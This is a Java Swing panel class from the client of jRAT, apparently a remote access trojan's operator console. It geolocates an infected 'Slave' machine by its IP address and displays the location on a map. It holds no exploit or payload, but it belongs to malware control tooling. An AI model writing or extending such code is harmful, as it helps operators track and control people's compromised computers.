package se.jrat.client.ui.panels;

import java.awt.BorderLayout;
import java.util.Map;

import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.ErrorDialog;
import se.jrat.client.Slave;
import se.jrat.client.net.GeoIP;
import se.jrat.client.ui.components.JRemoteScreenPane;


@SuppressWarnings("serial")
public class PanelControlTrace extends PanelControlParent {

	private JTable table;

	public DefaultTableModel getModel() {
		return (DefaultTableModel) table.getModel();
	}

	public PanelControlTrace(Slave sl) {
		super(sl);
		setLayout(new BorderLayout(0, 0));

		JRemoteScreenPane.ImagePanel panel = new JRemoteScreenPane().new ImagePanel();
		add(panel);
		
		try {
			Map<String, String> info = GeoIP.getInfo(sl.getRawIP());
			panel.update(GeoIP.getMap(4, Double.parseDouble(info.get("latitude")), Double.parseDouble(info.get("longitude")), true));
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}
}
